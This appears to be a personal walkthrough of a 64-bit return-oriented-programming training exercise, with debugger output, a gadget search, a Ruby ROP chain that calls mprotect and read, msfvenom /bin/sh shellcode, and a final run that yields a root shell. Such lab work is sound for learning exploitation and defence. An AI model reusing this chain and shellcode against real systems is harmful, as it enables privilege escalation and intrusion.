#thanks to A ROP Primer solution 64-bit style
https://blog.techorganic.com/2015/10/09/a-rop-primer-solution-64-bit-style/

#get level0 binary from
wget -O level0.x https://gist.github.com/superkojiman/b28c801a3b042072bc69/raw/620c9794df2a2774b6d3e686a5eaaa4e109e2fe8/level0

#install ropper for easy gadget search
pip install ropper

#install peda
git clone https://github.com/longld/peda.git ~/peda
#setup peda for gdb
echo "source ~/peda/peda.py" >> ~/.gdbinit

#after looking at the program, it seem everything is in main
gdb-peda$ c
Continuing.
[+] ROP tutorial level0
[+] What's your name? aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbcccccccc
[+] Bet you can't ROP me, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbcccccccc!

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x400278 (<_init>:	sub    rsp,0x8)
RCX: 0x4a ('J')
RDX: 0x6b6760 --> 0x0 
RSI: 0x7fffffb5 
RDI: 0x0 
RBP: 0x6262626262626262 ('bbbbbbbb')
RSP: 0x7fffffffe258 ("cccccccc")
RIP: 0x400fe2 (<main+84>:	ret)
R8 : 0x6363636363636363 ('cccccccc')
R9 : 0x488a00 --> 0x0 
R10: 0x6161616161616161 ('aaaaaaaa')
R11: 0x246 
R12: 0x0 
R13: 0x401630 (<__libc_csu_init>:	push   r14)
R14: 0x4016c0 (<__libc_csu_fini>:	push   rbx)
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400fd7 <main+73>:	call   0x407360 <printf>
   0x400fdc <main+78>:	mov    eax,0x0
   0x400fe1 <main+83>:	leave  
=> 0x400fe2 <main+84>:	ret    
   0x400fe3:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x400fed:	nop    DWORD PTR [rax]
   0x400ff0 <__libc_start_main>:	push   r14
   0x400ff2 <__libc_start_main+2>:	mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe258 ("cccccccc")
0008| 0x7fffffffe260 --> 0x0 
0016| 0x7fffffffe268 --> 0x100000000 
0024| 0x7fffffffe270 --> 0x7fffffffe338 --> 0x7fffffffe5f7 ("/root/Desktop/myC/stackOverflow/level0.x")
0032| 0x7fffffffe278 --> 0x400f8e (<main>:	push   rbp)
0040| 0x7fffffffe280 --> 0x400278 (<_init>:	sub    rsp,0x8)
0048| 0x7fffffffe288 --> 0xb9e98b1835a5c382 
0056| 0x7fffffffe290 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400fe2 in main ()
gdb-peda$ vmmap 
Start              End                Perm	Name
0x00400000         0x004b4000         r-xp	/root/Desktop/myC/stackOverflow/level0.x
0x006b4000         0x006b6000         rw-p	/root/Desktop/myC/stackOverflow/level0.x
0x006b6000         0x006db000         rw-p	[heap]
0x00007ffff7ff8000 0x00007ffff7ffa000 rw-p	mapped
0x00007ffff7ffa000 0x00007ffff7ffd000 r--p	[vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 r-xp	[vdso]
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]

#so padding till rip is 40 bytes

gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x0000000000400f8e <+0>:	push   rbp
   0x0000000000400f8f <+1>:	mov    rbp,rsp
   0x0000000000400f92 <+4>:	sub    rsp,0x40
   0x0000000000400f96 <+8>:	mov    DWORD PTR [rbp-0x24],edi
   0x0000000000400f99 <+11>:	mov    QWORD PTR [rbp-0x30],rsi
   0x0000000000400f9d <+15>:	mov    QWORD PTR [rbp-0x38],rdx
   0x0000000000400fa1 <+19>:	mov    edi,0x487b88
   0x0000000000400fa6 <+24>:	call   0x407cf0 <puts>
   0x0000000000400fab <+29>:	mov    edi,0x487ba0
   0x0000000000400fb0 <+34>:	mov    eax,0x0
   0x0000000000400fb5 <+39>:	call   0x407360 <printf>
   0x0000000000400fba <+44>:	lea    rax,[rbp-0x20]
   0x0000000000400fbe <+48>:	mov    rdi,rax
   0x0000000000400fc1 <+51>:	call   0x407b00 <gets>
   0x0000000000400fc6 <+56>:	lea    rax,[rbp-0x20]
   0x0000000000400fca <+60>:	mov    rsi,rax
   0x0000000000400fcd <+63>:	mov    edi,0x487bb8
   0x0000000000400fd2 <+68>:	mov    eax,0x0
   0x0000000000400fd7 <+73>:	call   0x407360 <printf>
   0x0000000000400fdc <+78>:	mov    eax,0x0
   0x0000000000400fe1 <+83>:	leave  
=> 0x0000000000400fe2 <+84>:	ret

#program use gets to red form stdin to buff which means string is terminated with \n = \x0a

#game plan
#1)change heap's memory protection to R/W/X 0x006b6000
#2)read shellcode into heap
#3)execute shellcode

#to do all this without executing anything on the stack
#need some gadget like 
#pop rax; pop rdi; pop rsi; pop rdx; ret
#syscall; ret

#searching for gadgets for the job
ropper --file ./level10.x -p | grep rdi
0x00000000004005a2: pop rdi; pop rbp; ret;

ropper --file ./level10.x -p | grep rsi
0x0000000000432f29: pop rdx; pop rsi; ret;

ropper --file ./level10.x --search syscall
0x00000000004546b5: syscall; ret;

ropper --file ./level10.x --search "%; ret" --quality 1 | grep rax
0x000000000043168d: pop rax; ret;
0x000000000041919f: xor rax, rax; ret;
**quality 1 is like depth 1

ropper --file ./level10.x --search "add rax" --quality 1
0x0000000000453b20: add rax, 1; ret;

wonder why theres so many gadget.  file cmd says the elf is statically linked ^^
file ./level10.x
./level10.x: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=9c06d009174f9e5e36ddc89d4687ee9f0891173e, not stripped

Anyway, with the gadgets above a typical syscall can be done on the stack like

0x000000000043168d: pop rax; ret;
syscall number
0x00000000004005a2: pop rdi; pop rbp; ret;
arg1
garbage
0x0000000000432f29: pop rdx; pop rsi; ret;
arg3
arg2
0x00000000004546b5: syscall; ret;

#following the above plan and found gadgets
#stage 1 exploit

./level0Stage1.rb
#!/usr/bin/ruby

def p64(num)					#convert num to 64 bit native indian
	return [num].pack("Q")			#too lazy to type this ^^
end

pad = "A"*40

#stage 1 program using gets, so string will be terminated with \x0a
#prepare memory for running shellcode (R/W/X) with mprotecy syscall
poprax = p64(0x000000000043168d)		#: pop rax; ret;
mprotect = p64(9) 				#int mprotect(void *addr, size_t len, int prot);
						#mprotect syscall number = 10 or \x0a or \n
						#however, will be terminated b/c gets terminate string when see \n
						#so had to use 9 and increment it to 10 with the following gadget
						#set memory protection i.e R/W/X
addrax = p64(0x0000000000453b20)		# add rax, 1; ret; increment rax by 1 = 10 = mprotect syscall number
poprdirbp = p64(0x00000000004005a2)		#: pop rdi; pop rbp; ret;
addr = p64(0x006b6000)				#0x006b6000         0x006db000         rw-p	[heap]
garbage = p64(0xffffffffffffffff)		#garbage
poprdxrsi = p64(0x0000000000432f29)		#: pop rdx; pop rsi; ret;
prot = p64(0x7)					#permission = R/W/X
memSize = p64(0x2000)				#size
syscall = p64(0x00000000004546b5)		#run

#read shellcode from stdin and copy to heap (0x006b6000)
#poprax = p64(0x000000000043168d)            #: pop rax; ret;
read = p64(0)                              	#read syscall number, ssize_t read(int fd, void *buf, size_t count);
#poprdirbp = p64(0x00000000004005a2)         #: pop rdi; pop rbp; ret;
fd = p64(0)                  			#stdin = 0
#garbage = p64(0xffffffffffffffff)           #garbage
#poprdxrsi = p64(0x0000000000432f29)         #: pop rdx; pop rsi; ret;
shellSize = p64(47)    	               #shellcoed length = 47 bytes msfvenom -p linux/x64/exec CMD=/bin/sh -f ruby
#addr = p64(0x006b6000)			#address to write shellcode to
#syscall = p64(0x00000000004546b5)		#run, after stage 2 as read into memory, ret will return
#addr = p64(0x006b6000)			#to shellcode address

buff = ""
buff += pad
buff += poprax
buff += mprotect 
buff += addrax
buff += poprdirbp
buff += addr
buff += garbage
buff += poprdxrsi
buff += prot
buff += memSize
buff += syscall 
buff += poprax
buff += read
buff += poprdirbp 
buff += fd
buff += garbage
buff += poprdxrsi
buff += shellSize 
buff += addr
buff += syscall
buff += addr

print buff + "\n"

#stage2 exploit
#!/usr/bin/ruby


#msfvenom -p linux/x64/exec CMD=/bin/sh -f ruby -b "\x0a"

buff =
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00" +
"\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8" +
"\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57" +
"\x48\x89\xe6\x0f\x05"

print buff + "\n"

#running exploit

test@kali:/tmp$ id
uid=1000(test) gid=1000(test) groups=1000(test)
test@kali:/tmp$ (ruby ./level0Stage1.rb; ruby ./level0Stage2.rb; cat ) | ./level0.x 
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½C!
id
uid=1000(test) gid=1000(test) euid=0(root) egid=0(root) groups=0(root),1000(test)
